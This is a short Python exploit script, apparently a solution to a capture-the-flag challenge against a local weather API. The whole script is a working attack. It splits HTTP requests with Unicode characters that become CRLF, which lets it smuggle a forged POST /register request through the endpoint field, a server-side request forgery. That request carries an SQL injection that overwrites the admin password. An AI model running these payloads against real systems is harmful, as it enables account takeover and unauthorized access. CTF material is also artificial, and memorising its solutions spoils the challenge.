import requests

NEW_ADMIN_PW = 'iwashere'

s = "\u0120"
r = "\u010D"
n = "\u010A"

# sql injection
username = 'admin'
password = f"{NEW_ADMIN_PW}') ON CONFLICT (username) DO UPDATE SET password = '{NEW_ADMIN_PW}';".replace("'", '%27').replace(' ', s)

injectedRequests = f'127.0.0.1/ HTTP/1.1{r+n}Host: 127.0.0.1{r+n+r+n}' # to startup the initial simple request
# actual payload to make a register request and send the password
injectedRequests += f'POST /register HTTP/1.1{r+n}Host: 127.0.0.1{r+n}Content-Type: application/x-www-form-urlencoded{r+n}Content-Length: {len(username)+len(password)+19}{r+n+r+n}username={username}&password={password}{r+n+r+n}'
injectedRequests += f'GET ' # use this to make some request to the server again

payload = {
    "endpoint": injectedRequests.replace(' ', s),
    "city": "Montreal",
    "country": "CA"
}
requests.post('http://127.0.0.1:1337/api/weather', json=payload)
